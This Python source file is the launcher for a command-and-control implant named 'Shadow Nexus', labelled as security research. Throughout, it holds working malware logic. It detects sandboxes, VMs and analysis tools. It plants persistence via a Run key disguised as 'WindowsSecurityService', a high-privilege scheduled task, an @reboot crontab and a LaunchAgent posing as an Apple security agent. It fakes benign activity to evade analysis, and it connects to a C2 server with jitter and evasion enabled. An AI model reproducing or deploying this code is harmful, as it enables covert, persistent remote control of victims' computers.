#!/usr/bin/env python3
# stealth_wrapper.py - Silent background agent for security research

import sys
import os
import time
import logging
import tempfile
import platform
import random
import ctypes
import traceback
import signal
from datetime import datetime

# Import configuration if available
try:
    # Try to import from parent directory
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from config import *
except ImportError:
    # Default values if config not available
    ENABLE_EVASION = True
    ENABLE_PERSISTENCE = False
    AGENT_PREFIX = "SHADOW"
    DEFAULT_CHECK_INTERVAL = 45
    DEFAULT_JITTER = 15
    C2_SERVER_URL = "http://127.0.0.1:5000"  # Default to localhost

# Create a temp directory for logs if we don't have write permissions in current directory
log_dir = tempfile.gettempdir()
log_file = os.path.join(log_dir, "shadow_nexus_agent.log")

# Configure logging to file only, no console output
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.NullHandler()  # No console output
    ]
)
logger = logging.getLogger('StealthAgent')

# Configuration - Edit these values before compiling if not using config.py
C2_SERVER_URL = C2_SERVER_URL if 'C2_SERVER_URL' in globals() else "http://your-c2-server:5000"
CHECK_INTERVAL = DEFAULT_CHECK_INTERVAL if 'DEFAULT_CHECK_INTERVAL' in globals() else 45
JITTER = DEFAULT_JITTER if 'DEFAULT_JITTER' in globals() else 15
AGENT_PREFIX = AGENT_PREFIX if 'AGENT_PREFIX' in globals() else "SHADOW"
ENABLE_EVASION = ENABLE_EVASION if 'ENABLE_EVASION' in globals() else True
ENABLE_PERSISTENCE = ENABLE_PERSISTENCE if 'ENABLE_PERSISTENCE' in globals() else False

def is_admin():
    """Check if the script is running with admin/root privileges"""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:  # Unix-based systems
            return os.geteuid() == 0
    except Exception:
        return False

def check_environment():
    """Check if running in a security sandbox/VM and adjust behavior"""
    logger.info("Performing environment checks")
    
    # Log basic system info
    logger.info(f"OS: {platform.system()} {platform.version()}")
    logger.info(f"Machine: {platform.machine()}")
    logger.info(f"Admin privileges: {is_admin()}")
    
    # Detect sandbox environments - for research purposes only
    sandbox_indicators = []
    
    # Check VM identifiers
    if platform.system() == "Windows":
        try:
            import winreg
            vm_registry_checks = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\Description\System\BIOS"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation")
            ]
            
            for hkey, key_path in vm_registry_checks:
                try:
                    key = winreg.OpenKey(hkey, key_path)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            if any(x.lower() in str(value).lower() for x in ["vmware", "virtualbox", "qemu", "xen", "vbox"]):
                                sandbox_indicators.append(f"vm_identifier_in_registry_{key_path}")
                                break
                            i += 1
                        except OSError:
                            # No more values
                            break
                except Exception as e:
                    logger.debug(f"Error checking registry path {key_path}: {e}")
        except Exception:
            pass

    # Check common VM names in hostname
    hostname = platform.node().lower()
    vm_names = ['virtual', 'vm', 'sandbox', 'analysis', 'test']
    if any(name in hostname for name in vm_names):
        sandbox_indicators.append("suspicious_hostname")
    
    # Check username for sandbox indicators
    try:
        import getpass
        username = getpass.getuser().lower()
        suspicious_users = ['sandbox', 'virus', 'malware', 'test', 'admin', 'analysis']
        if any(user in username for user in suspicious_users):
            sandbox_indicators.append("suspicious_username")
    except Exception:
        pass
    
    # Check common security tools - for research demonstration only
    if platform.system() == "Windows":
        suspicious_processes = [
            "wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe",
            "pestudio.exe", "process hacker.exe", "ida64.exe", "x64dbg.exe"
        ]
        try:
            import subprocess
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
            for proc in suspicious_processes:
                if proc in output:
                    sandbox_indicators.append("security_tool_detected")
                    break
        except Exception:
            pass
    
    # Log results
    if sandbox_indicators:
        logger.info(f"Environment indicators detected: {sandbox_indicators}")
    else:
        logger.info("No suspicious environment indicators detected")
    
    return sandbox_indicators

def setup_persistence():
    """Setup persistence mechanism appropriate for the platform"""
    if not ENABLE_PERSISTENCE:
        logger.info("Persistence disabled by configuration")
        return False
        
    # Check if platform is supported
    if platform.system() not in ["Windows", "Linux", "Darwin"]:
        logger.warning(f"Persistence not implemented for {platform.system()}")
        return False
        
    logger.info("Setting up persistence")
    
    # Get path to the executable
    if getattr(sys, 'frozen', False):
        # We're running as a compiled executable
        executable_path = sys.executable
    else:
        # We're running as a script
        executable_path = os.path.abspath(sys.argv[0])
    
    logger.info(f"Executable path: {executable_path}")
    
    success = False
    
    try:
        # Windows persistence
        if platform.system() == "Windows":
            try:
                import winreg as reg
                
                # Add to registry run key
                key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
                
                try:
                    key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(key, 'WindowsSecurityService', 0, reg.REG_SZ, executable_path)
                    reg.CloseKey(key)
                    
                    logger.info(f"Added persistence via registry run key")
                    success = True
                except Exception as reg_error:
                    logger.error(f"Failed to add registry persistence: {reg_error}")
                
                # Try scheduled task if registry failed and we have admin
                if not success and is_admin():
                    task_name = "WindowsSecurityUpdate"
                    cmd = f'schtasks /create /tn {task_name} /tr "{executable_path}" /sc onlogon /rl highest /f'
                    result = os.system(cmd)
                    if result == 0:
                        logger.info(f"Added persistence via scheduled task")
                        success = True
                    else:
                        logger.error(f"Scheduled task creation failed with code {result}")
                        
            except Exception as e:
                logger.error(f"Windows persistence setup failed: {e}")
        
        # Linux/macOS persistence
        elif platform.system() in ["Linux", "Darwin"]:
            # Try user crontab
            try:
                import subprocess
                cron_cmd = f"@reboot {executable_path}"
                crontab_result = subprocess.run(
                    f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', 
                    shell=True, check=True
                )
                if crontab_result.returncode == 0:
                    logger.info(f"Added persistence via user crontab")
                    success = True
                
            except Exception as e:
                logger.error(f"Failed to add crontab persistence: {e}")
                
            # Try user startup (macOS)
            if not success and platform.system() == "Darwin":
                try:
                    launch_agent_dir = os.path.expanduser("~/Library/LaunchAgents")
                    os.makedirs(launch_agent_dir, exist_ok=True)
                    plist_path = os.path.join(launch_agent_dir, "com.apple.security.agent.plist")
                    
                    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                    
                    with open(plist_path, "w") as f:
                        f.write(plist_content)
                        
                    subprocess.run(["launchctl", "load", plist_path])
                    logger.info(f"Added persistence via Launch Agent")
                    success = True
                except Exception as e:
                    logger.error(f"Failed to add Launch Agent persistence: {e}")
    
    except Exception as e:
        logger.error(f"Persistence setup failed: {traceback.format_exc()}")
        success = False
        
    logger.info(f"Persistence setup {'successful' if success else 'failed'}")
    return success

def simulate_legitimate_activity():
    """Simulate legitimate activity to appear benign"""
    # This is a research function to demonstrate sandbox evasion techniques
    logger.debug("Simulating legitimate activity")
    
    # Sleep for random time to avoid sandbox detection
    time.sleep(random.uniform(1.5, 3))
    
    # Perform some benign file operations
    try:
        temp_file = os.path.join(tempfile.gettempdir(), f"cache_{random.randint(1000, 9999)}.tmp")
        with open(temp_file, "w") as f:
            f.write("Temporary data " * 10)
        
        # Read the file
        with open(temp_file, "r") as f:
            data = f.read()
            
        # Delete the file
        os.remove(temp_file)
    except Exception as e:
        logger.debug(f"File operation in simulate_activity failed: {e}")
    
    # Additional sleep to mimic human behavior
    time.sleep(random.uniform(0.5, 1.5))

def signal_handler(signum, frame):
    """Handle termination signals gracefully"""
    logger.info(f"Received signal {signum}, shutting down...")
    # The global 'agent' will be checked and stopped in the finally block of main()
    sys.exit(0)

def main():
    """Main function for the stealth agent"""
    # Set up signal handlers for graceful termination
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # On Windows we can use CTRL_CLOSE_EVENT
    if platform.system() == "Windows":
        try:
            signal.signal(signal.CTRL_CLOSE_EVENT, signal_handler)
        except:
            pass
            
    agent = None
    try:
        logger.info("Starting Shadow Nexus stealth agent")
        
        # Check environment first
        environment_indicators = check_environment()
        
        # Simulate legitimate activity to evade sandbox analysis
        try:
            simulate_legitimate_activity()
        except Exception as e:
            logger.error(f"Error during activity simulation: {e}")
        
        # Setup persistence if configured
        if ENABLE_PERSISTENCE:
            try:
                setup_persistence()
            except Exception as e:
                logger.error(f"Persistence setup failed: {e}")
        
        # Generate a unique agent ID with specified prefix
        agent_id = f"{AGENT_PREFIX}-{platform.node()}-{os.getpid()}"
        logger.info(f"Using agent ID: {agent_id}")
        
        # Try to import the advanced agent
        try:
            # First try to import from relative path (for development)
            from advanced_agent import AdvancedTestAgent
        except ImportError:
            try:
                # Then try from agents package (for installed version)
                from agents.advanced_agent import AdvancedTestAgent
            except ImportError:
                # Last try from the same directory
                sys.path.append(os.path.dirname(os.path.abspath(__file__)))
                from advanced_agent import AdvancedTestAgent
        
        # Create the agent
        logger.info(f"Connecting to C2: {C2_SERVER_URL}")
        agent = AdvancedTestAgent(
            c2_url=C2_SERVER_URL,
            interval=CHECK_INTERVAL,
            jitter=JITTER,
            agent_id=agent_id,
            pyinstaller_path=None  # Auto-detect
        )
        
        # Enable evasion mode
        if ENABLE_EVASION:
            agent.set_evasion_mode(True)
            logger.info("Evasion mode enabled")
        
        # Start the agent threads
        agent.start()
        logger.info("Agent started successfully")
        
        # Main loop - keep the process running
        while agent.running:
            time.sleep(10)
            
    except Exception as e:
        logger.error(f"Critical error in stealth agent: {traceback.format_exc()}")
    finally:
        # Ensure we shut down cleanly if the process is terminated
        if agent:
            logger.info("Shutting down agent")
            try:
                agent.stop()
            except Exception as e:
                logger.error(f"Error during shutdown: {e}")
        logger.info("Agent stopped")

if __name__ == "__main__":
    main()
